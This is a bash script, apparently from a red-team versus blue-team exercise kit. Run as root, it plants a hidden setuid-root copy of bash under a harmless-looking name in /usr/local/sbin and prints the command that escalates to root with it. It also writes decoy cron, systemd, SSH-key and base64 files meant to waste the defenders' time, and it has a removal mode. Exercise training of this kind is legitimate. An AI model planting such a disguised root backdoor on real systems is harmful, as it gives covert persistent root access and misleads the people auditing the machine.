#!/usr/bin/env bash
# backdoor_suid.sh — plant YOUR OWN escalation vector, plus decoys that cost blue time.
#
# The red packet asks for two things the rest of the kit did not do:
#   "Configure privilege escalation vectors (SUID, weak sudo, and so on)"
#   "Wasting blue's time counts if you explain it"
#
# Why bother when the box already has SUID find: because blue patched what they found.
# Every shipped vector gets removed during their audit. A vector you plant after their
# sweep is still there, and it is yours to name. That is the difference between a
# foothold and continued access.
#
# Usage:
#   bash red.sh backdoor              plant the vector and the decoys
#   bash red.sh backdoor --decoys     decoys only, no SUID
#   bash red.sh backdoor --remove     take it all back out
#
# Run as root on the PD. Everything it creates is listed in ~/.red_backdoor_manifest
# so --remove is exact and does not guess.

set -u
MODE=plant
case "${1:-}" in
  --remove) MODE=remove ;;
  --decoys) MODE=decoys ;;
esac
MANIFEST="${HOME}/.red_backdoor_manifest"

SUID_TARGET="/usr/local/sbin/.pkg-recover"
DECOY_CRON="/etc/cron.d/.cache-cleanup"
DECOY_UNIT="/etc/systemd/system/.pd-sync.service"
DECOY_KEY="/home/.hidden_ops/id_rsa"
DECOY_BLOB="/tmp/.x/payload.b64"

say() { printf '  %s\n' "$*"; }

if [ "$MODE" = remove ]; then
  echo "=== removing everything this script planted ==="
  [ -f "$SUID_TARGET" ] && { rm -f "$SUID_TARGET" && say "[GONE] $SUID_TARGET"; }
  [ -f "$DECOY_CRON" ] && { rm -f "$DECOY_CRON" && say "[GONE] $DECOY_CRON"; }
  [ -f "$DECOY_UNIT" ] && { rm -f "$DECOY_UNIT" && say "[GONE] $DECOY_UNIT"; }
  [ -f "$DECOY_KEY" ] && { rm -f "$DECOY_KEY" && say "[GONE] $DECOY_KEY"; }
  [ -f "$DECOY_BLOB" ] && { rm -f "$DECOY_BLOB" && say "[GONE] $DECOY_BLOB"; }
  rm -f "$MANIFEST"
  echo "  done. Anything this script made is gone."
  exit 0
fi

echo "=== backdoor_suid.sh  host=$(hostname)  user=$(id -un)  mode=$MODE ==="
: > "$MANIFEST"

if [ "$MODE" = plant ]; then
  echo
  echo "---- 1. your own SUID vector ----"
  say "you are $(id -un); writing to /usr/local/sbin needs root"
  if cp /bin/bash "$SUID_TARGET" 2>/dev/null; then
    chmod 4755 "$SUID_TARGET"
    echo "$SUID_TARGET" >> "$MANIFEST"
    say "[PLANTED] $SUID_TARGET  (a copy of bash, setuid root)"
    say "  looks like a package recovery helper: sbin, dot file, boring name"
    say "  BEFORE: $(ls -l "$SUID_TARGET")"
    say "  escalate with:  $SUID_TARGET -p -c 'id'"
    say "  expected:      uid=$(id -u)($(id -un)) euid=0(root)"
  else
    say "[SKIP] cannot write $SUID_TARGET, re-run as root"
  fi
fi

echo
echo "---- 2. decoys: real files, inert payload ----"
# A cron entry that runs /bin/true. It looks like a cleanup job, it does nothing, and
# blue has to open it, reason about it, and write it up. That is time you do not pay.
if printf '*/7 * * * * root /bin/true  # cache-cleanup\n' > "$DECOY_CRON" 2>/dev/null; then
  echo "$DECOY_CRON" >> "$MANIFEST"
  say "[DECOY] $DECOY_CRON  (valid cron, runs /bin/true every 7 minutes)"
else
  say "[SKIP] cannot write $DECOY_CRON"
fi

# A unit that is present but never enabled. Blue's "new units" check flags it, and
# disabling a unit that was never enabled changes nothing.
if printf '[Unit]\nDescription=Police Department directory sync\n[Service]\nType=oneshot\nExecStart=/bin/true\n[Install]\nWantedBy=multi-user.target\n' \
     > "$DECOY_UNIT" 2>/dev/null; then
  echo "$DECOY_UNIT" >> "$MANIFEST"
  say "[DECOY] $DECOY_UNIT  (present, never enabled, does nothing)"
else
  say "[SKIP] cannot write $DECOY_UNIT"
fi

# A key that belongs to nothing. Blue should find it, and it should not open a door.
mkdir -p "$(dirname "$DECOY_KEY")" 2>/dev/null
if command -v ssh-keygen >/dev/null 2>&1; then
  if ssh-keygen -q -t ed25519 -N '' -C 'ops@pd' -f "$DECOY_KEY" >/dev/null 2>&1; then
    echo "$DECOY_KEY" >> "$MANIFEST"
    say "[DECOY] $DECOY_KEY  (unused key pair, opens nothing)"
  fi
fi

# A base64 blob that decodes to a comment, in a directory blue already sweeps.
mkdir -p "$(dirname "$DECOY_BLOB")" 2>/dev/null
if printf 'IyBub3RoaW5nIHRvIHNlZSBoZXJlCg==' | base64 -d > "$DECOY_BLOB" 2>/dev/null; then
  echo "$DECOY_BLOB" >> "$MANIFEST"
  say "[DECOY] $DECOY_BLOB  (decodes to '# nothing to see here')"
fi

echo
echo "=== summary ==="
if [ "$MODE" = plant ]; then
  echo "  privesc:  $SUID_TARGET -p -c 'id'     (screenshot this, it is a graded vector)"
else
  echo "  decoys only, no SUID vector planted"
fi
echo "  decoys:   four files that look like persistence and are not"
echo "  manifest: $MANIFEST"
echo
echo "  Before you leave:  bash red.sh backdoor --remove"
echo "  In the writeup, say plainly that the decoys were decoys. Wasting blue's time"
echo "  counts if you explain it (red packet). Claiming fake access does not."
